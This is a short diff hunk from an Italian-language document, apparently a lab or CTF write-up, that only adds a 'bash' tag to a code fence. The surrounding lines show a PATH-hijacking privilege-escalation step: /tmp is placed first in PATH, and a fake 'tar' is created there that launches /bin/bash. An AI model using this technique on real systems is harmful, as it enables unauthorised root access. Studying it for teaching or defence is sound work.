@@ -183,7 +183,7 @@ export PATH=/tmp:/home/moneygrabber/.local/bin:/home/moneygrabber/bin:/usr/local
 
 dove la prima directory è quella scelta per contenere l'eseguibile malevolo, generabile con i seguenti comandi:
 
-```
+```bash
 cd /tmp
 echo "/bin/bash" > tar
 chmod +x tar
